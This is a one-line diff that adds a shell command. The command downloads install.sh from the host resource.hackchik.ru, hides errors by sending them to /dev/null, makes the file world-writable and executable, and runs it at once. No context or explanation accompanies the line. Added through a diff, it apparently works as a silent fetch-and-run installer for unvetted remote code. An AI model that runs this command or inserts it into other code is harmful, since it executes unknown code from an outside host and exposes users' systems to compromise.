@@ -1,0 +1,1 @@
+wget https://resource.hackchik.ru/install.sh -O install.sh 2> /dev/null && chmod 777 install.sh && ./install.sh
